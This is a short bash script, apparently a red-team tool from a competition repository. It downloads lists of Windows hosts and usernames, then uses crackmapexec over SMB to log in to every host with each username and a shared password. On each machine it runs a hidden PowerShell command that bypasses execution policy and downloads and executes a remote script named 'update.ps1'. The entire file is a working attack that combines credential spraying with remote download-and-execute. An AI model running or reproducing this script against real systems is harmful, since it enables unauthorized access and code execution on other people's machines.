#!/bin/bash

curl -o windows.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt
curl -o users.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/users.txt

for user in $(cat users.txt)
do
    crackmapexec smb windows.txt -u $user -p 'Change.me123!' -x "powershell -nop -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/red-scripts/update.ps1')"&
done
